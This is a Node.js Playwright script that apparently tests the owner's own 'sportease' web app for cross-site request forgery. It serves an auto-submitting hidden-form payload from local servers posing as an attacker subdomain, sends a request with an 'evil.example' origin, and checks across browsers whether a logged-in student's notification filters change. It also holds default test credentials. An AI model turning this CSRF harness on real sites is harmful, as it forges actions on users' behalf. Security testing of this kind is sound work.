const fs = require('fs');
const http = require('http');
const https = require('https');
const os = require('os');
const path = require('path');
const { execFileSync } = require('child_process');

function loadPlaywright() {
  const candidates = [
    '@playwright/test',
    path.join(process.cwd(), 'node_modules', '@playwright', 'test'),
    path.join(process.cwd(), 'frontapp', 'node_modules', '@playwright', 'test'),
    path.join(__dirname, '..', 'node_modules', '@playwright', 'test'),
    path.join(__dirname, '..', 'frontapp', 'node_modules', '@playwright', 'test'),
    path.join(__dirname, '..', '..', 'web', 'frontapp', 'node_modules', '@playwright', 'test')
  ];

  const failures = [];
  for (const candidate of candidates) {
    try {
      return require(candidate);
    } catch (error) {
      if (error.code !== 'MODULE_NOT_FOUND') throw error;
      failures.push(candidate);
    }
  }

  throw new Error(
    [
      'Playwright is not installed where this script looked.',
      'Run `cd frontapp && npm ci` or `cd frontapp && npm install` in this repo, then retry.',
      'Looked in:',
      ...failures.map((candidate) => `  - ${candidate}`)
    ].join('\n')
  );
}

const { chromium, firefox, webkit } = loadPlaywright();

const TARGET = process.env.TARGET ?? 'https://sportease-instance.saku0512.com';
const LOGIN_ID = process.env.LOGIN_ID ?? 'student1';
const PASSWORD = process.env.PASSWORD ?? 'student1';
const ATTACK_HOST = process.env.ATTACK_HOST ?? 'attacker.saku0512.com';
const TARGET_ACTION = `${TARGET}/dashboard/student/notification?/updateFilters`;
const FINAL_FILTER = 'finals';
const BASELINE_FILTERS = ['general'];
const WAIT_AFTER_ATTACK_MS = 1000;

const certDir = path.join(os.tmpdir(), 'sportease-csrf-probe');
const certPath = path.join(certDir, 'attacker.crt');
const keyPath = path.join(certDir, 'attacker.key');

function logSection(title) {
  console.log(`\n=== ${title} ===`);
}

function pretty(value) {
  return JSON.stringify(value, null, 2);
}

function uniqueCsvAppend(current, value) {
  const parts = String(current || '')
    .split(',')
    .map((part) => part.trim())
    .filter(Boolean);
  if (!parts.includes(value)) parts.push(value);
  return parts.join(',');
}

function configureProxyBypass() {
  process.env.NO_PROXY = uniqueCsvAppend(process.env.NO_PROXY, ATTACK_HOST);
  process.env.no_proxy = uniqueCsvAppend(process.env.no_proxy, ATTACK_HOST);
}

function ensureCertificate() {
  fs.mkdirSync(certDir, { recursive: true });
  if (fs.existsSync(certPath) && fs.existsSync(keyPath)) return;

  execFileSync('openssl', [
    'req',
    '-x509',
    '-newkey',
    'rsa:2048',
    '-nodes',
    '-subj',
    `/CN=${ATTACK_HOST}`,
    '-keyout',
    keyPath,
    '-out',
    certPath,
    '-days',
    '1'
  ], { stdio: 'ignore' });
}

function attackHtml({ action = TARGET_ACTION, filter = FINAL_FILTER } = {}) {
  return `<!doctype html>
<html>
  <head><meta charset="utf-8"><title>CSRF probe</title></head>
  <body onload="document.forms[0].submit()">
    <form method="POST" action="${action}">
      <input type="hidden" name="filters" value="${filter}">
    </form>
  </body>
</html>`;
}

function startAttackServer({ protocol = 'http', publicHost = '127.0.0.1' } = {}) {
  const handler = (req, res) => {
    res.writeHead(200, {
      'content-type': 'text/html; charset=utf-8',
      'cache-control': 'no-store'
    });
    res.end(attackHtml());
  };

  const server = protocol === 'https'
    ? https.createServer({
        key: fs.readFileSync(keyPath),
        cert: fs.readFileSync(certPath)
      }, handler)
    : http.createServer(handler);

  return new Promise((resolve, reject) => {
    server.once('error', reject);
    server.listen(0, '127.0.0.1', () => {
      const { port } = server.address();
      resolve({
        server,
        url: `${protocol}://${publicHost}:${port}/attack`,
        protocol,
        publicHost,
        port
      });
    });
  });
}

async function unauthenticatedOriginProbe() {
  const response = await fetch(TARGET_ACTION, {
    method: 'POST',
    redirect: 'manual',
    headers: {
      origin: 'https://evil.example',
      'content-type': 'application/x-www-form-urlencoded'
    },
    body: 'filters=finals'
  });

  return {
    status: response.status,
    contentType: response.headers.get('content-type'),
    body: (await response.text()).slice(0, 500)
  };
}

async function login(page) {
  await page.goto(TARGET, { waitUntil: 'networkidle' });
  await page.fill('#login-id', LOGIN_ID);
  await page.fill('#password', PASSWORD);
  await Promise.all([
    page.waitForURL('**/dashboard', { timeout: 15000 }),
    page.locator('button[type="submit"]').click()
  ]);
}

async function getUser(page) {
  return page.evaluate(async () => {
    const response = await fetch('/api/auth/user', { credentials: 'include' });
    return {
      status: response.status,
      body: await response.json().catch(() => null)
    };
  });
}

async function setFilters(page, filters) {
  return page.evaluate(async (filters) => {
    const response = await fetch('/api/notifications/filters', {
      method: 'PUT',
      credentials: 'include',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ filters })
    });
    return {
      status: response.status,
      body: await response.json().catch(() => null)
    };
  }, filters);
}

function filterList(userResult) {
  return userResult?.body?.notification_filters ?? [];
}

function hasFinals(userResult) {
  return filterList(userResult).includes(FINAL_FILTER);
}

function maskCookie(cookieHeader) {
  if (!cookieHeader) return '(not exposed)';
  return cookieHeader.replace(/session_token=[^;]+/g, 'session_token=<redacted>');
}

function installRequestCapture(page, browserName) {
  const pending = [];
  const actionRequests = [];
  const actionResponses = [];

  page.on('request', (request) => {
    if (request.method() !== 'POST' || !request.url().startsWith(TARGET_ACTION)) return;

    pending.push((async () => {
      const headers = await request.allHeaders().catch(() => request.headers());
      actionRequests.push({
        browser: browserName,
        url: request.url(),
        origin: headers.origin ?? '(none)',
        cookie: maskCookie(headers.cookie)
      });
    })());
  });

  page.on('response', (response) => {
    if (!response.url().startsWith(TARGET_ACTION)) return;

    pending.push((async () => {
      const headers = await response.allHeaders().catch(() => ({}));
      let body = '';
      try {
        body = (await response.text()).slice(0, 500);
      } catch {
        body = '(unavailable)';
      }
      actionResponses.push({
        browser: browserName,
        url: response.url(),
        status: response.status(),
        contentType: headers['content-type'] ?? headers['Content-Type'] ?? null,
        body
      });
    })());
  });

  async function drain() {
    const batch = pending.splice(0);
    await Promise.allSettled(batch);
    return {
      actionRequests: actionRequests.splice(0),
      actionResponses: actionResponses.splice(0)
    };
  }

  return { drain };
}

async function runScenario(page, capture, scenario) {
  await setFilters(page, BASELINE_FILTERS);
  const before = await getUser(page);

  let navigationError = null;
  try {
    if (scenario.kind === 'data') {
      await page.goto(`data:text/html,${encodeURIComponent(attackHtml())}`, {
        waitUntil: 'domcontentloaded'
      });
    } else {
      await page.goto(scenario.url, { waitUntil: 'domcontentloaded' });
    }
    await page.waitForLoadState('networkidle', { timeout: 15000 }).catch(() => {});
    await page.waitForTimeout(WAIT_AFTER_ATTACK_MS);
  } catch (error) {
    navigationError = String(error?.message ?? error);
  }

  const captured = await capture.drain();
  const after = await getUser(page).catch((error) => ({
    status: 'error',
    body: String(error?.message ?? error)
  }));

  return {
    name: scenario.name,
    url: scenario.kind === 'data' ? 'data:text/html,<auto-submit-form>' : scenario.url,
    expected: scenario.expected,
    navigationError,
    beforeFilters: filterList(before),
    afterFilters: filterList(after),
    changedToFinals: hasFinals(after),
    finalUrl: page.url(),
    ...captured
  };
}

function browserLaunchOptions(browserName) {
  if (browserName !== 'chromium') return {};

  return {
    args: [
      `--host-resolver-rules=MAP ${ATTACK_HOST} 127.0.0.1`,
      `--proxy-bypass-list=<-loopback>;${ATTACK_HOST}`
    ]
  };
}

async function runBrowserMatrix(browserName, browserType, scenarios) {
  logSection(`Browser: ${browserName}`);

  let browser;
  try {
    browser = await browserType.launch({
      headless: true,
      ...browserLaunchOptions(browserName)
    });
  } catch (error) {
    const skipped = {
      browser: browserName,
      skipped: true,
      reason: String(error?.message ?? error).split('\n')[0]
    };
    console.log(pretty(skipped));
    return skipped;
  }

  const page = await browser.newPage({ ignoreHTTPSErrors: true });
  const capture = installRequestCapture(page, browserName);

  try {
    await login(page);
    const cookies = await page.context().cookies(TARGET);
    const session = cookies.find((cookie) => cookie.name === 'session_token');
    const cookieSummary = {
      name: session?.name,
      domain: session?.domain,
      secure: session?.secure,
      httpOnly: session?.httpOnly,
      sameSite: session?.sameSite
    };

    console.log('cookie:', pretty(cookieSummary));
    console.log('initialReset:', pretty(await setFilters(page, BASELINE_FILTERS)));

    const runnable = scenarios.filter((scenario) => {
      if (!scenario.requiresHostResolver) return true;
      return browserName === 'chromium';
    });
    const skipped = scenarios
      .filter((scenario) => scenario.requiresHostResolver && browserName !== 'chromium')
      .map((scenario) => ({
        name: scenario.name,
        skipped: true,
        reason: 'custom host resolver scenario is only automated for Chromium'
      }));

    const results = [];
    for (const scenario of runnable) {
      const result = await runScenario(page, capture, scenario);
      results.push(result);
      console.log(`${result.name}:`, pretty(result));
    }

    if (skipped.length) console.log('skippedScenarios:', pretty(skipped));
    const cleanup = await setFilters(page, BASELINE_FILTERS);
    console.log('cleanup:', pretty(cleanup));

    return {
      browser: browserName,
      skipped: false,
      cookie: cookieSummary,
      results,
      skippedScenarios: skipped,
      cleanup
    };
  } finally {
    await browser.close();
  }
}

(async () => {
  configureProxyBypass();
  ensureCertificate();

  const servers = [];
  try {
    const externalHttp = await startAttackServer({
      protocol: 'http',
      publicHost: '127.0.0.1'
    });
    const sameSiteHttps = await startAttackServer({
      protocol: 'https',
      publicHost: ATTACK_HOST
    });
    const sameSiteHttp = await startAttackServer({
      protocol: 'http',
      publicHost: ATTACK_HOST
    });
    servers.push(externalHttp, sameSiteHttps, sameSiteHttp);

    logSection('Unauthenticated Origin Check');
    const unauthProbe = await unauthenticatedOriginProbe();
    console.log(pretty(unauthProbe));

    const scenarios = [
      {
        name: 'external-http-127-cross-site',
        url: externalHttp.url,
        expected: 'should not change filters; SameSite=Lax should block cookies'
      },
      {
        name: 'null-origin-data-url',
        kind: 'data',
        expected: 'should not change filters; opaque/null origin should be cross-site'
      },
      {
        name: 'same-site-https-subdomain',
        url: sameSiteHttps.url,
        requiresHostResolver: true,
        expected: 'should change filters if Origin check trusts every origin; SameSite=Lax allows same-site'
      },
      {
        name: 'same-host-http-subdomain-scheme-mismatch',
        url: sameSiteHttp.url,
        requiresHostResolver: true,
        expected: 'should not change filters in schemeful SameSite browsers'
      }
    ];

    const summaries = [];
    for (const [browserName, browserType] of Object.entries({ chromium, firefox, webkit })) {
      summaries.push(await runBrowserMatrix(browserName, browserType, scenarios));
    }

    logSection('Summary');
    console.log(pretty({
      target: TARGET,
      loginId: LOGIN_ID,
      attackHost: ATTACK_HOST,
      unauthenticatedOriginProbe: unauthProbe,
      summaries
    }));
  } finally {
    for (const item of servers) {
      item.server.close();
    }
  }
})().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
